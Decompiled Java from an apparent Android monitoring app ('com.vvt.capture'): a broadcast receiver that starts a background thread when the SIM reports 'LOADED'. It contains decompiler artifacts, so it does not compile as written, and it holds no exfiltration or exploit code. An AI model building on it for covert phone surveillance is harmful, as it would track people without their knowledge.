package com.vvt.capture.simchange;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class SimChangeCapture$SimChangedReceiver
  extends BroadcastReceiver
{
  private Thread b = null;
  
  public SimChangeCapture$SimChangedReceiver(SimChangeCapture paramSimChangeCapture) {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    boolean bool1 = SimChangeCapture.d();
    Object localObject1;
    Object localObject2;
    if ((!bool1) || (paramIntent != null))
    {
      localObject1 = paramIntent.getExtras();
      if (localObject1 != null) {
        localObject2 = "ss";
      }
    }
    try
    {
      localObject1 = ((Bundle)localObject1).get((String)localObject2);
      localObject1 = (String)localObject1;
      bool2 = SimChangeCapture.d();
      if ((!bool2) || (localObject1 != null))
      {
        localObject2 = "LOADED";
        bool1 = ((String)localObject1).equals(localObject2);
        if (bool1)
        {
          localObject1 = this.b;
          if (localObject1 == null)
          {
            bool1 = SimChangeCapture.d();
            if (bool1) {}
            localObject1 = new java/lang/Thread;
            localObject2 = new com/vvt/capture/simchange/e;
            ((e)localObject2).<init>(this);
            ((Thread)localObject1).<init>((Runnable)localObject2);
            this.b = ((Thread)localObject1);
            localObject1 = this.b;
            ((Thread)localObject1).start();
          }
        }
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = SimChangeCapture.e();
        if (bool2)
        {
          localObject2 = "SimChangeCapture";
          String str = "SimChangedReceiver.onReceive";
          Log.e((String)localObject2, str, localException);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/SimChangeCapture$SimChangedReceiver.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */